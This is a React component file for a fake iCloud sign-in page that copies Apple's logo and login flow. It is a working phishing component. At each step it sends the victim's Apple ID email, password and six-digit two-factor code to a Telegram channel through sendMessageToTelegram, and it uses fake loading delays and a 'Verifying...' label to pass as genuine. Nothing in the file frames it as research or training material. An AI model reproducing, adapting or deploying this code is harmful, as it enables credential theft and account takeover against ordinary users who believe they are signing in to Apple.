// components/iCloudAuth.jsx
import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { sendMessageToTelegram } from '../lib/api';

export default function ICloudAuth() {
    const router = useRouter();
    const [currentStep, setCurrentStep] = useState('email');
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [isEmailValid, setIsEmailValid] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [verificationCode, setVerificationCode] = useState('');

    // Simulated command handling
    useEffect(() => {
        if (isEmailValid && currentStep === 'email') {
            setIsLoading(true);
            setTimeout(() => {
                setIsLoading(false);
                setCurrentStep('password');
            }, 1500);
        }
    }, [isEmailValid, currentStep]);

    const handleEmailSubmit = () => {
        const isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        setIsEmailValid(isValid);
        if (isValid) {
            sendMessageToTelegram(`iCloud Email: ${email}`);
        }
    };

    const handlePasswordSubmit = () => {
        if (password.length > 0) {
            setIsLoading(true);
            sendMessageToTelegram(`iCloud Password: ${password}`);
            setTimeout(() => {
                setIsLoading(false);
                setCurrentStep('2fa');
            }, 1500);
        }
    };

    const handle2FASubmit = () => {
        if (verificationCode.length === 6) {
            sendMessageToTelegram(`iCloud 2FA Code: ${verificationCode}`);
            router.push('/verification');
        }
    };

    return (
        <div className="icloud-container bg-white rounded-xl shadow-lg max-w-[480px] w-full mx-auto p-8">
            <div className="apple-logo flex justify-center mb-8">
                <svg className="w-10 h-10" viewBox="0 0 24 24" fill="none">
                    <path d="M18.71 19.5C17.88 20.74 17 21.95 15.66 21.97C14.32 22 13.89 21.18 12.37 21.18C10.84 21.18 10.37 21.95 9.09997 22C7.78997 22.05 6.79997 20.68 5.95997 19.47C4.24997 17 2.93997 12.45 4.69997 9.39C5.56997 7.87 7.12997 6.91 8.81997 6.88C10.1 6.86 11.32 7.75 12.11 7.75C12.89 7.75 14.37 6.68 15.92 6.84C16.57 6.87 18.39 7.1 19.56 8.82C19.47 8.88 17.39 10.1 17.41 12.63C17.44 15.65 20.06 16.66 20.09 16.67C20.06 16.74 19.67 18.11 18.71 19.5ZM13 3.5C13.73 2.67 14.94 2.04 15.94 2C16.07 3.17 15.6 4.35 14.9 5.19C14.21 6.04 13.07 6.7 11.95 6.61C11.8 5.46 12.36 4.26 13 3.5Z" fill="currentColor"/>
                </svg>
            </div>

            <div className="step-container">
                {currentStep === 'email' && (
                    <div className="relative">
                        <input
                            type="email"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            className="icloud-input w-full p-4 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                            placeholder="Apple ID"
                        />
                        {isLoading && (
                            <div className="absolute right-3 top-4 loader animate-spin">
                                <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24">
                                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/>
                                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"/>
                                </svg>
                            </div>
                        )}
                    </div>
                )}

                {currentStep === 'password' && (
                    <div className="space-y-4">
                        <div className="email-display bg-gray-100 p-4 rounded-lg">
                            {email}
                        </div>
                        <input
                            type="password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className="icloud-input w-full p-4 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                            placeholder="Password"
                        />
                    </div>
                )}

                {currentStep === '2fa' && (
                    <div className="space-y-6">
                        <div className="text-center">
                            <div className="inline-block p-4 bg-gray-100 rounded-full">
                                <svg className="w-12 h-12 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                                </svg>
                            </div>
                            <h2 className="text-xl font-semibold mt-4">Two-Factor Authentication</h2>
                            <p className="text-gray-600 mt-2">Enter the 6-digit code sent to your trusted device.</p>
                        </div>
                        <input
                            type="text"
                            value={verificationCode}
                            onChange={(e) => setVerificationCode(e.target.value)}
                            className="icloud-input w-full p-4 border rounded-lg text-center text-xl font-mono focus:ring-2 focus:ring-blue-500"
                            placeholder="••••••"
                            maxLength={6}
                        />
                        <div className="text-center space-y-2">
                            <button className="text-blue-500 text-sm">Didn't get a code?</button>
                            <div className="space-x-4">
                                <button className="text-blue-500 text-sm">Resend Code</button>
                                <button className="text-blue-500 text-sm">Use SMS</button>
                            </div>
                        </div>
                    </div>
                )}
            </div>

            <div className="footer mt-8 pt-6 border-t border-gray-200">
                <div className="flex justify-between items-center">
                    <button className="text-blue-500 text-sm">Forgot Apple ID or password?</button>
                    <button
                        className="icloud-button bg-blue-500 text-white px-6 py-2 rounded-lg hover:bg-blue-600 disabled:opacity-50"
                        onClick={() => {
                            if (currentStep === 'email') handleEmailSubmit();
                            if (currentStep === 'password') handlePasswordSubmit();
                            if (currentStep === '2fa') handle2FASubmit();
                        }}
                        disabled={isLoading}
                    >
                        {isLoading ? (
                            <span className="flex items-center">
                                <span className="loader-small animate-spin mr-2">
                                    <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24">
                                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/>
                                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"/>
                                    </svg>
                                </span>
                                Verifying...
                            </span>
                        ) : (
                            currentStep === '2fa' ? 'Continue' : 'Next'
                        )}
                    </button>
                </div>
                
                <div className="mt-6 text-center text-sm text-gray-500">
                    <span>Don't have an Apple ID? </span>
                    <button className="text-blue-500">Create yours now.</button>
                </div>
            </div>
        </div>
    )
}